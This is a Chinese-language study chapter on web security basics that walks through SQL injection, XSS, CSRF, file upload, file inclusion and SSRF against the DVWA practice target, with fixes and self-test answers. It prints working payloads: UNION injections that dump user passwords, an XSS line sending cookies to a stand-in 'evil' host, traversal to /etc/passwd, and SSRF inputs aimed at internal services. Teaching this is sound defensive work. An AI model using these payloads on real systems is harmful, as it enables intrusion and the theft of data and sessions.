---
title: Web 安全基础
date: 2026-09-03
tags: [网络安全, 初级]
---

# 03 · Web 安全基础——OWASP 逐项四步法

> 每个漏洞按固定节奏学：**原理 → 手工利用 → DVWA 复现 → 修复视角**。你写过 20 年 Web 代码，这一章你会不断出现"原来我以前写的代码有这问题"的瞬间——这就是攻击者视角开始生效的标志。

## 🎯 学习目标

1. Burp Suite 完成代理配置，抓改一次 HTTPS 请求
2. 手工完成 DVWA SQL 注入 Low→Medium（不借助 sqlmap）
3. 对 XSS/CSRF/上传/包含/SSRF 每种漏洞能画出"利用数据流"
4. 每种漏洞对应说出 2-3 个开发者修复手段

## 📖 核心知识

### 3.0 Burp 工作流（手术台搭建）

1. 安装 Burp Community → Proxy 监听 127.0.0.1:8080
2. 浏览器指向代理，访问 http://burp 下载 CA 证书并信任（HTTPS 中间人的"合法版"）
3. 核心动作：**Intercept 拦截改包** → **Repeater 重放调试** → **HTTP history 回溯**

### 3.1 SQL 注入

**原理**：用户输入被拼接进 SQL 语句的**代码上下文**。本质和"字符串进 eval"同构——你最熟悉的错误。

**手工利用（DVWA Low，输入框输入 ID）**：

```sql
-- 正常：SELECT first_name,last_name FROM users WHERE id = '1'
1' ORDER BY 2--+          -- 探列数：报错→列数不对；成功→至少2列
1' UNION SELECT user(),database()--+      -- 联合查询：当前库
1' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--+
1' UNION SELECT user,password FROM users--+
```

逐段解析：`1'` 闭合原引号 → 注入新语法 → `--+` 注释掉尾部残余引号。`information_schema` 是 MySQL 的"数据库地图"——先看地图再拿数据。

**布尔盲注**（页面无回显只有真/假两种状态）：

```sql
1' AND (SELECT SUBSTR(database(),1,1))='d'--+   -- 逐字符猜解，自动化=写脚本循环
```

**修复视角**：参数化查询（预编译）是唯一根治；ORM 不等于免疫（拼接仍在）；最小权限 DB 账号；错误信息不回显。

### 3.2 XSS（跨站脚本）

| 类型 | 注入位置 | 触发方式 |
|---|---|---|
| 反射型 | URL 参数回显 | 诱导点击构造链接 |
| 存储型 | 存入 DB 的内容（评论/昵称） | 任何浏览者触发，**危害最大** |
| DOM 型 | 前端 JS 处理 location/hash | 纯前端，服务端日志无痕 |

危害本质：**在你域下以用户身份执行 JS**——偷 Cookie（会话）、伪造请求、键盘记录。

```html
<script>fetch('http://evil/'+document.cookie)</script>   <!-- 教学示意：理解危害模型 -->
<img src=x onerror=alert(document.domain)>               <!-- 标签被过滤时的常见绕过思路 -->
```

**修复视角**：输出按上下文编码（HTML/属性/JS/URL 四种上下文编码不同）；CSP 响应头（`Content-Security-Policy`）；HttpOnly Cookie 让偷到的会话不可读；输入校验只是辅助，**输出编码才是正解**。

### 3.3 CSRF（跨站请求伪造）

**原理**：浏览器自动携带 Cookie 的机制 + 恶意站点的伪造请求 = "借用户的身份发请求"。与 XSS 的区别：CSRF 伪造请求但**看不到响应**；XSS 能读响应。

**防御**：CSRF Token（随机值放表单+服务端校验）、SameSite Cookie（Lax/Strict）、关键操作二次确认。Referer 校验是弱防御（可被部分绕过）。

### 3.4 文件上传与解析漏洞

绕过分类（DVWA 上传关的进阶思路）：
- 前端校验 → 直接改包
- MIME 校验 → 改 Content-Type
- 扩展名黑名单 → 双写/大小写/ `.php5`/`.phtml`
- 内容检测 → 图片马（文件头 + GIF89a）
- 解析漏洞：Nginx `/x.jpg/.php`、IIS 分号截断（历史版本）

**修复**：白名单+重命名+存储与 Web 根隔离+不回显路径+二次渲染。

### 3.5 文件包含（LFI/RFI）

```php
include($_GET['page']);   // 危险代码模式——认出这个模式就认出了漏洞
?page=../../../../etc/passwd      // 目录遍历
?page=php://filter/convert.base64-encode/resource=index.php  // 伪协议读源码
```

**修复**：白名单映射（page=about → 固定文件）、关闭 `allow_url_include`、open_basedir。

### 3.6 SSRF（服务端请求伪造）

**原理**：让**服务器**替你发请求——它在内网，你能到到平时够不着的 169.254.169.254（云元数据）、内网管理端。

```
?url=http://127.0.0.1:6379/   → 打内网 Redis
?url=file:///etc/passwd       → file 协议读文件（视实现）
```

**修复**：出站白名单、禁用非 http 协议、禁重定向、元数据服务加固（云上 IMDSv2）。

## 🔬 动手实操

DVWA 部署（docker 一行）：`docker run -d -p 80:80 vulnerables/web-dvwa`
顺序：SQL 注入 Low 手工 → Medium（引号过滤→数字型绕过思路）→ XSS 三关 → 上传/包含。每个关卡写 5 行笔记：payload + 为什么有效。

## ⚠️ 常见坑

1. 无脑 sqlmap——先手工，工具是手熟后的加速器
2. 只会 DVWA 默认难度——Medium/High 的绕过才是真学习
3. 把"打中靶场"当"会了"——能给别人讲清"为什么有效"才算会
4. 修复视角偷懒——白帽子价值一半在"怎么修"
5. 在非授权目标上"顺手试试"——红线在此

## ✅ 自测题

<details>
<summary>1. 参数化查询为什么能根治 SQL 注入？</summary>

SQL 结构与数据在协议层分离：输入永远作为数据（绑定参数）传输，不进入 SQL 解析器的代码上下文——无论输入什么都改变不了语句结构。

</details>

<details>
<summary>2. HttpOnly 防得住 XSS 吗？</summary>

防不住 XSS 本身，只防住"偷 Cookie"这一种后果。XSS 仍可代用户发请求、改页面。纵深防御：编码+CSP+HttpOnly 一起上。

</details>

<details>
<summary>3. SameSite=Lax 能防全部 CSRF？</summary>

不能。Lax 拦跨站 POST，但顶级导航 GET 仍带 Cookie；GET 型状态变更操作依然可被打。

</details>

<details>
<summary>4. 为什么 SSRF 在云上危害骤增？</summary>

云元数据服务（169.254.169.254）从内网可达且返回临时凭证——SSRF 打到它等于拿到云 API 权限（如获取角色 Token）。

</details>

<details>
<summary>5. input 校验和 output 编码，哪个是 XSS 的正解？</summary>

输出编码。输入校验降低风险但绕过场景多；XSS 的本质是"数据进入代码上下文"，在输出点按上下文编码才是根修。

</details>

## 🔗 对应周任务与资源

- 对应计划：**第1年 W09-W13**；资源：PortSwigger Web Security Academy（免费）、《Web 安全深度剖析》、DVWA
